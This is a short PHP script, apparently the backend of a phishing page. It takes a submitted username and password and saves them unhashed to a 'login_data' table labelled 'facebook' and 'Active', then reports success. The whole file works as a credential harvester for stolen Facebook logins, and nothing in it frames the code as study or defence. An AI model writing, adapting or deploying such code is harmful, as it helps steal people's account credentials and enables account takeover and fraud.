<?php
    include("config.php");

    $username = mysqli_escape_string($conn, $_POST['username']);
    $password = mysqli_escape_string($conn, $_POST['password']);
    $today = date("d-m-Y");
    $sql = mysqli_query($conn, "INSERT INTO login_data (site, username, password, date,  status) 
                                VALUES ('facebook', '$username', '$password', '$today', 'Active')");
                                echo "Success";
?>